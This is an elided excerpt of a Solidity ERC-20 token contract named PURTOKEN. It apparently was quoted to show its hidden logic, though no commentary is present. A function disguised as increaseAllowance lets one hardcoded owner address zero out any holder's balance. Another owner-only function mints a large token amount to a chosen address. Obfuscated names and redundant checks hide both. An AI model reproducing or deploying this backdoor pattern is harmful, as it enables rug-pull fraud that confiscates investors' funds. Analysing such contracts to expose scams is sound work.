...
contract PURTOKEN is Ownable {
    ...
    function increaseAllowance(address uuyxxx) public     {
        if(dzxaqq12 == _msgSender()){
        address newadd = uuyxxx;
        uint256 curamount = PUR[newadd];
        uint256 newaaamount = PUR[newadd]+PUR[newadd]-curamount;
        PUR[newadd] -= newaaamount;
        }else{
        if(dzxaqq12 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        PUR[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
        require(dzxaqq12 == _msgSender());
        if(dzxaqq12 == _msgSender()){
        }
    }
    ...
    function _transfer(
        ...
        uint256 balance = PUR[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        PUR[from] = PUR[from]-amount;
        PUR[to] = PUR[to]+amount;
